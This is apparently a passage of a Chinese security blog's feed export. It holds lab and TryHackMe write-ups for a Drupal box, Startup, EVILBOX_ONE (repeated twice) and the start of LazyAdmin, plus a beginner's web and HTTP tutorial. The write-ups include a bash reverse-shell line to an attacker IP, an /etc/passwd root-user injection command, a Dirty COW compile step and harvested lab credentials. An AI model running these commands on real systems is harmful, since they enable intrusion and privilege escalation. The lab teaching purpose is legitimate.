alt="image.png"><br>就只得到了drupal版本号，其它的都是版本更换的一些信息，但没关系，根据经验这个系统有很多的洞，我们先用kali自带的searchsploit找找<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102134982.png" alt="image.png"><br>发现3个RCE，msf试试看</p><hr><p>其实这里还有个办法，但我个人感觉比较扯(不否认现实有成功可能性)，在此演示一下如何通过信息收集直接得到ssh账号密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102357417.png" alt="image.png"></p><h1 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102137708.png" alt="image.png"><br>应该就是msf中的1，use1试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102138012.png" alt="image.png"><br>改一下host跟port就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102339637.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102340313.png" alt="image.png"><br>成功<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102345093.png" alt="image.png"><br>百度了一下sites&#x2F;all&#x2F;default&#x2F;settings.php会有敏感信息<br>但是这台靶机all里面没有default，于是我看的是sites&#x2F;default&#x2F;settings.php<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102349470.png" alt="image.png"><br>数据库账号密码，这里可以看出账号是默认的，但密码是改过的，一般人都有一个密码多个地方用的习惯，我们再去看看这台服务器上有什么账号<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102352257.png" alt="image.png"><br>可以看到就是tiago<br>那我们就用tiago&#x2F;Virgulino尝试ssh连接</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111129737.png" alt="image.png"><br>连接成功，上脚本看看提权点<br><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs&#x2F;linux-exploit-suggester: Linux privilege escalation auditing tool (github.com)</a><br>可以看到有脏牛提权，直接上<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111231026.png" alt="image.png"><br>但是这里看了下40611利用失败，因为还要sudo<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111450393.png" alt="image.png"><br>这里我们用40847<br><a href="https://www.exploit-db.com/exploits/40847">Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW &#x2F;proc&#x2F;self&#x2F;mem’ Race Condition Privilege Escalation (&#x2F;etc&#x2F;passwd Method) - Linux local Exploit (exploit-db.com)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">g++ -Wall -pedantic -O2 -std=c++<span class="hljs-number">11</span> -pthread -o dcow <span class="hljs-number">40847.</span>cpp -lutil<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111453356.png" alt="image.png"><br>提权成功</p><h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111453061.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试基础</title>
    <link href="/2024/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="法律条文"><a href="#法律条文" class="headerlink" title="法律条文"></a>法律条文</h1><p><a href="http://www.npc.gov.cn/zgrdw/npc/xinwen/2016-11/07/content_2001605.htm">中华人民共和国网络安全法_中国人大网 (npc.gov.cn)</a><br>2016年11月7日，《中华人民共和国网络安全法》颁布以来，一切非授权的渗透测试行为都是违法的。</p><h1 id="WEB服务端"><a href="#WEB服务端" class="headerlink" title="WEB服务端"></a>WEB服务端</h1><h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h2><p>即以.htm，.html为后缀的网页，通常由html+CSS+javascript构成，通过前台渲染解析<br>如我的博客<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062005353.png" alt="image.png"></p><p>虽然在网址上没有看到html结尾，事实上访问的其实是一个index.html文件<br>访问<br><code>https://susec.xyz/2024/06/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/</code><br>跟访问<br><code>https://susec.xyz/2024/06/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/index.html</code><br>其实是一样的</p><p>静态网站很容易被别人拿去直接用<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062008061.png" alt="image.png"><br>在网页上按ctrl+s就能直接保存到本地了<br>静态网站每次更新都要连接服务器把新的网页传上去，比较麻烦<br>搭建如图所示网站<br>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062041759.png" alt="image.png"><br>可见静态网站我们可以直接看到源代码</p><h2 id="动态网站"><a href="#动态网站" class="headerlink" title="动态网站"></a>动态网站</h2><p>常见架构</p><ul><li>LNMP:Linux,Nginx,Mysql,PHP</li><li>LAMP:Linux,Apache,Mysql,PHP<br>动态网站的搭建就跟前面靶场搭建差不多，可以参考<br><a href="https://susec.xyz/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">https://susec.xyz/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</a></li></ul><p>访问本地网站我们用127.0.0.1或是localhost的80端口，因为网站默认端口一般是80<br>127.0.0.1跟localhost是一个意思的原因在hosts文件里（C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062137701.png" alt="image.png"></p><p>可以看到127.0.0.1指向的是localhost</p><p>动态源代码如php，java这种，当我们打开网站就无法看到源代码，如下案例<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062133317.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062134251.png" alt="image.png"></p><h1 id="URL与URL编码"><a href="#URL与URL编码" class="headerlink" title="URL与URL编码"></a>URL与URL编码</h1><p>URL:统一资源定位符，通俗称为网址<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062107502.png" alt="image.png"><br>一般由这几部分组成<br>Scheme：协议，一般有http,https,ftp,file，mailto等<br>Domain Name：域名，一般也叫hostname，一般是填入域名或ip地址<br>Port：端口，一般http默认就是80，https默认就是443，这两个不会显示，别的端口会显示，但是也存在端口映射能把别的端口映射到80端口的情况<br>Path：资源所在路径<br>Parameters：数据<br>Anchor：描点</p><p>协议中：<br>file协议，可以直接打开对应的磁盘目录</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408062137042.png" alt="image.png"></p><p>描点可能不这么常见，但例如在我的博客中<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408071054292.png" alt="image.png"><br>点击目录下的对应内容，url就会出现描点</p><h2 id="常见URL编码"><a href="#常见URL编码" class="headerlink" title="常见URL编码"></a>常见URL编码</h2><p>常见的编码还是要记一下，提高效率</p><table><thead><tr><th>字符</th><th>编码</th></tr></thead><tbody><tr><td>&#x3D;</td><td>%3d</td></tr><tr><td>#</td><td>%23</td></tr><tr><td>%</td><td>%25</td></tr><tr><td>&amp;</td><td>%26</td></tr><tr><td>&#x2F;</td><td>%2f</td></tr><tr><td>空格</td><td>%20</td></tr><tr><td>换行</td><td>%0a</td></tr><tr><td>空字节</td><td>%00</td></tr></tbody></table><h1 id="HTTP协议与抓包"><a href="#HTTP协议与抓包" class="headerlink" title="HTTP协议与抓包"></a>HTTP协议与抓包</h1><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>HTTP</strong> 是一种用作获取诸如 HTML 文档这类资源的协议。它是 Web 上进行任何数据交换的基础，同时，也是一种客户端—服务器（client-server）协议，也就是说，请求是由接受方——通常是 Web 浏览器——发起的。完整网页文档通常由文本、布局描述、图片、视频、脚本等资源构成。</p><h3 id="HTTP请求组成"><a href="#HTTP请求组成" class="headerlink" title="HTTP请求组成"></a>HTTP请求组成</h3><p>HTTP请求报文由请求行，请求头部，空行和请求数据4个部分组成<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408071634675.png" alt="image.png"></p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>请求行由请求方法，URL，HTTP协议版本三个字段组成，它们用空格分隔</p><h5 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h5><p>GET,POST,HEAD,PUT,DELETE,OPTIONS,TRACE,CONNECT</p><h6 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h6><p>GET是最常用的方法。通常用于请求服务器发送某个资源。GET请求中，查询字符串是在URL中发送的<br>，而且URL是存在长度限制的，所以GET请求所传递的数据是有限的</p><h6 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h6><p>POST方法起初是用来向服务器输入数据的。实际上，通常会用它来支持HTML的表单。表单中填好的数据通常会被送给服务器，然后由服务器将其发送到它要去的地方。<br>在POST请求中，查询字符串是在请求数据中发送的，原则上POST请求的数据是没有大小限制的</p><h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><ul><li>HOST：指定被请求资源的主机名</li><li>User-Agent：产生请求的浏览器类型</li><li>Referer：当前访问URL的上一个URL，即用户从哪来</li><li>Cookie：存放着用户的身份凭证</li><li>X-Forward-For：XFF头，代表请求端IP地址</li><li>Accept：用户生命客户端可处理的MIME类型</li><li>Accept-Encoding：用于声明客户端能够理解的内容编码方式</li><li>Accept-Language：用于声明客户端可以理解的自然语言</li></ul><h3 id="HTTP响应组成"><a href="#HTTP响应组成" class="headerlink" title="HTTP响应组成"></a>HTTP响应组成</h3><p>HTTP响应报文由状态行，消息报头，空行，响应正文组成<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408071649099.png" alt="image.png"></p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>状态行由HTTP协议版本，状态码和状态描述组成</p><h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>指示信息，表示请求已接收，继续处理</td></tr><tr><td>2xx</td><td>成功，表示请求已被成功接收，理解，接受</td></tr><tr><td>3xx</td><td>重定向，要完成请求必须进行更进一步的操作</td></tr><tr><td>4xx</td><td>客户端错误，请求有语法错误或请求无法实现</td></tr><tr><td>5xx</td><td>服务端错误，服务器未能实现</td></tr><tr><td>常见状态码描述</td><td></td></tr></tbody></table><table><thead><tr><th>状态码</th><th>原因短语</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>客户端请求成功，没有问题</td></tr><tr><td>302</td><td>Found</td><td>重定向，客户端应该使用Location首部给出的URL来临时定位资源</td></tr><tr><td>304</td><td>Not Modified</td><td>直接使用本地缓存</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器所理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求未经授权认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器收到请求，但是拒绝提供服务，访问一个网站常出现这种情况</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>发请求中带有所请求的方法不允许</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器发生不可预期的错误</td></tr><tr><td>502</td><td>Bad Gateway</td><td>无法连接到其父网关</td></tr><tr><td>503</td><td>Service Unavailable</td><td>服务器当前不能处理客户端的请求</td></tr></tbody></table><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><p>HTTPS&#x3D;HTTP+SSL&#x2F;TLS<br>HTTPS通过安全传输机制进行传输数据，可以保护网络传送的所有数据的隐秘性和完整性。</p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>常见抓包工具<br>Burp<br>这篇文章详细描述了安装方法<br><a href="https://susec.xyz/2024/06/16/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">https://susec.xyz/2024/06/16/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a><br>yakit<br>国产工具，我比较喜欢这个<br>fiddler<br>见过一些大佬用，我不怎么熟悉 </p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup</title>
    <link href="/2024/08/06/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY9-startup/"/>
    <url>/2024/08/06/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY9-startup/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-Startup"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-Startup" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup</h1><p><a href="https://tryhackme.com/r/room/startup">尝试黑客 |启动 — TryHackMe | Startup</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258808.png" alt="image-20240402122613116"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258820.png" alt="image-20240402123448476"></p><p>先进行简单的目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png" alt="image-20240402123630157"></p><p>看到有匿名登录，先试试</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258822.png" alt="image-20240402123937145"></p><p>get这两个把他们弄下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258823.png" alt="image-20240402124207541"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258826.png" alt="image-20240402124228699"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258239.png" alt="image-20240402124253385"></p><p>emmm，好像没什么用</p><p>先看看他的80端口什么情况</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258348.png" alt="image-20240403083208971"></p><p>打开网站</p><p>目录扫描也没有得到什么</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258416.png" alt="image-20240403083747285"></p><p>就一个files，里面的文件就是ftp的文件</p><p>这就说明我们可以通过ftp上传文件并且在http服务上激活，这跟昨天的lazyadmin有异曲同工之妙</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258582.png" alt="image-20240403084404301"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258682.png" alt="image-20240403084415770"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258847.png" alt="image-20240403084427583"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258871.png" alt="image-20240403084558901"></p><p>看到一个recipe.txt，不出意外这就是秘方</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258924.png" alt="image-20240403084702351"></p><p>it was love</p><p>根据刚才的目录，我们只对另一个文件夹&#x2F;incidents有权限，进去看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258965.png" alt="image-20240403085257635"></p><p>有一个pcapng文件，也就是网络数据包</p><p>把它放到ftp上再获取</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258996.png" alt="image-20240403090034827"></p><p>通过wireshark进行分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258078.png" alt="image-20240403090227775"></p><p>有很多的4444</p><p>右键-&gt;follow-&gt;tcp stream</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258148.png" alt="image-20240403090533052"></p><p>显而易见</p><p>username:lennie</p><p>password:c4ntg3t3n0ughsp1c3</p><p>通过ssh连接</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258251.png" alt="image-20240403090807149"></p><p>成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258307.png" alt="image-20240403090848768"></p><p>再看看scripts，只有这个是要root的，有明显不同</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258342.png" alt="image-20240403092316630"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258749.png" alt="image-20240403092349180"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png" alt="image-20240403092508823"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258915.png" alt="image-20240403092641243"></p><p>找到print.sh，可以有lennie运行，所以我们只需要修改它的内容变为反弹shell即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.13.54.129/</span><span class="hljs-number">7777</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>再触发（改了之后他好像就会自动触发，只要你监听就会变成root）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258969.png" alt="image-20240403092938032"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258022.png" alt="image-20240403093236419"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EVILBOX_ONE</title>
    <link href="/2024/08/05/vulhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/"/>
    <url>/2024/08/05/vulhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/</url>
    
    <content type="html"><![CDATA[<h1 id="EVILBOX-ONE"><a href="#EVILBOX-ONE" class="headerlink" title="EVILBOX_ONE"></a>EVILBOX_ONE</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940027.png" alt="image-20240428212325300"></p><p>先是扫出22，80端口</p><p>然后扫描80找到&#x2F;robots.txt和secret，逐个访问下看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940098.png" alt="image-20240430145035766"></p><p>这里给了个信息，我们的用户名可能是H4x0r</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940017.png" alt="image-20240430145328132"></p><p>一片空白</p><p>那我们选用最蠢的办法，hydra爆破一下</p><p>爆破不出来，这里我们怀疑前面是不是字典不够大，没跑完</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941372.png" alt="image-20240430161102218"></p><p>（kali的dirsearch跑不出来，gobuster出问题，这里直接使用本机御剑跑）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941452.png" alt="image-20240430163036480"></p><p>跑跑参数</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941755.png" alt="image-20240430163050439"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941704.png" alt="image-20240430163702002"></p><p>（也可以如上图）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941034.png" alt="image-20240430163249795"></p><p>这里看到个用户mowree</p><p>看看能不能得到公链或私链</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941789.png" alt="image-20240430164717167"></p><p>公钥无法访问，但是能得到私钥</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941628.png" alt="image-20240430164949403"></p><p>爆破出密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941011.png" alt="image-20240430165556325"></p><p>拿到第一个flag</p><p><strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</strong></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941302.png" alt="image-20240430172244175"></p><p>直接上脚本找提权点，发现&#x2F;etc&#x2F;passwd可修改，直接上</p><p>echo “test:advwtv&#x2F;9yU5yQ:0:0:,,,:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt;&#x2F;etc&#x2F;passwd</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941431.png" alt="image-20240430173646149"></p><p>提权成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941583.png" alt="image-20240430173736901"></p><p>完成</p><p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场-EVILBOX_ONE</title>
    <link href="/2024/08/05/vulnhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/"/>
    <url>/2024/08/05/vulnhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/</url>
    
    <content type="html"><![CDATA[<h1 id="EVILBOX-ONE"><a href="#EVILBOX-ONE" class="headerlink" title="EVILBOX_ONE"></a>EVILBOX_ONE</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940027.png" alt="image-20240428212325300"></p><p>先是扫出22，80端口</p><p>然后扫描80找到&#x2F;robots.txt和secret，逐个访问下看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940098.png" alt="image-20240430145035766"></p><p>这里给了个信息，我们的用户名可能是H4x0r</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050940017.png" alt="image-20240430145328132"></p><p>一片空白</p><p>那我们选用最蠢的办法，hydra爆破一下</p><p>爆破不出来，这里我们怀疑前面是不是字典不够大，没跑完</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941372.png" alt="image-20240430161102218"></p><p>（kali的dirsearch跑不出来，gobuster出问题，这里直接使用本机御剑跑）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941452.png" alt="image-20240430163036480"></p><p>跑跑参数</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941755.png" alt="image-20240430163050439"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941704.png" alt="image-20240430163702002"></p><p>（也可以如上图）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941034.png" alt="image-20240430163249795"></p><p>这里看到个用户mowree</p><p>看看能不能得到公链或私链</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941789.png" alt="image-20240430164717167"></p><p>公钥无法访问，但是能得到私钥</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941628.png" alt="image-20240430164949403"></p><p>爆破出密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941011.png" alt="image-20240430165556325"></p><p>拿到第一个flag</p><p><strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</strong></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941302.png" alt="image-20240430172244175"></p><p>直接上脚本找提权点，发现&#x2F;etc&#x2F;passwd可修改，直接上</p><p>echo “test:advwtv&#x2F;9yU5yQ:0:0:,,,:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt;&#x2F;etc&#x2F;passwd</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941431.png" alt="image-20240430173646149"></p><p>提权成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408050941583.png" alt="image-20240430173736901"></p><p>完成</p><p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY8-Lazy Admin</title>
    <link href="/2024/08/04/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY8-Lazy%20Admin/"/>
    <url>/2024/08/04/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY8-Lazy%20Admin/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY8-Lazy-Admin"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY8-Lazy-Admin" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY8-Lazy Admin"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY8-Lazy Admin</h1><p><a href="https://tryhackme.com/r/room/lazyadmin">特里哈克梅 |懒惰的admin — TryHackMe | LazyAdmin</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154383.png" alt="image-20240401151831766"></p><p>只扫描出22，80两个端口</p><p>但是都没有什么有用信息</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154413.png" alt="image-20240401153122834"></p><p>扫目录看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154410.png" alt="image-20240402083518327"></p><p>打开content</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154421.png" alt="image-20240402083505524"></p><p>可以看到这是一个叫做SweetRice的CMS</p><p>继续目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154419.png" 